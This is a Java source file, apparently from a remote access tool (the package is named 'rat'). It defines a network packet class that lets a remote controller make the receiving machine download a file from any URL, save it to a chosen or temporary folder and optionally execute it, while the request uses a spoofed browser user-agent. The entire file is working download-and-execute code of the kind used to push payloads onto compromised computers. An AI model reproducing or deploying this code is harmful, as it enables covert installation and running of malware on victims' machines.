package de.sogomn.rat.packet;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class DownloadUrlPacket implements IPacket {
	
	private String address, directoryPath;
	private byte executeType;
	
	private static final String HTTP_PREFIX = "http://";
	private static final String USER_AGENT = "User-Agent";
	private static final String USER_AGENT_VALUE = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0";
	private static final String CONNECTION = "Connection";
	private static final String CONNECTION_VALUE = "close";
	private static final String DEFAULT_NAME = "file";
	private static final int BUFFER_SIZE = 1024;
	private static final byte NO = 0;
	private static final byte YES = 1;
	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
	
	public DownloadUrlPacket(final String address, final String directoryPath, final boolean execute) {
		this.directoryPath = directoryPath;
		
		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
		
		if (hasPrefix) {
			this.address = address;
		} else {
			this.address = HTTP_PREFIX + address;
		}
		
		executeType = execute ? YES : NO;
	}
	
	public DownloadUrlPacket(final String address, final String directoryPath) {
		this(address, directoryPath, false);
	}
	
	public DownloadUrlPacket() {
		this("", "");
	}
	
	private void copyStream(final InputStream in, final OutputStream out) throws IOException {
		final byte[] buffer = new byte[BUFFER_SIZE];
		
		int bytesRead = 0;
		
		while ((bytesRead = in.read(buffer)) != -1) {
			out.write(buffer, 0, bytesRead);
			out.flush();
		}
	}
	
	private DesktopFile readFile(final String address) throws IOException {
		HttpURLConnection.setFollowRedirects(true);
		
		final URL url = new URL(address);
		final HttpURLConnection con = (HttpURLConnection)url.openConnection();
		
		con.setRequestProperty(USER_AGENT, USER_AGENT_VALUE);
		con.setRequestProperty(CONNECTION, CONNECTION_VALUE);
		con.connect();
		
		final InputStream in = con.getInputStream();
		final String fileName = con.getURL().getFile();
		final int lastSlash = fileName.lastIndexOf("/");
		final int questionMark = fileName.indexOf("?");
		final String name;
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		
		copyStream(in, out);
		out.close();
		in.close();
		
		if (lastSlash != -1) {
			if (questionMark != -1) {
				name = fileName.substring(lastSlash + 1, questionMark);
			} else {
				name = fileName.substring(lastSlash + 1);
			}
		} else {
			name = DEFAULT_NAME;
		}
		
		final byte[] data = out.toByteArray();
		final DesktopFile file = new DesktopFile(name, data);
		
		return file;
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(address);
		connection.writeUTF(directoryPath);
		connection.writeByte(executeType);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		address = connection.readUTF();
		directoryPath = connection.readUTF();
		executeType = connection.readByte();
		
		if (directoryPath.isEmpty()) {
			directoryPath = TEMP_DIR;
		}
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final File directory = new File(directoryPath);
		
		String directoryPath = null;
		
		if (directory.isDirectory()) {
			directoryPath = this.directoryPath;
		} else {
			final File parent = directory.getParentFile();
			
			if (parent != null) {
				directoryPath = parent.getAbsolutePath();
			}
		}
		
		if (directoryPath != null) {
			try {
				final DesktopFile file = readFile(address);
				
				file.write(directoryPath);
				
				if (executeType == YES) {
					FileUtils.executeFile(directoryPath + File.separator + file.name);
				}
			} catch (final NullPointerException ex) {
				//...
			} catch (final IOException ex) {
				ex.printStackTrace();
			}
		}
	}
	
	private static class DesktopFile {
		
		final String name;
		final byte[] data;
		
		public DesktopFile(final String name, final byte[] data) {
			this.name = name;
			this.data = data;
		}
		
		public void write(final String directoryPath) {
			final String path = directoryPath + File.separator + name;
			
			FileUtils.createFile(path);
			FileUtils.writeData(path, data);
		}
		
	}
	
}
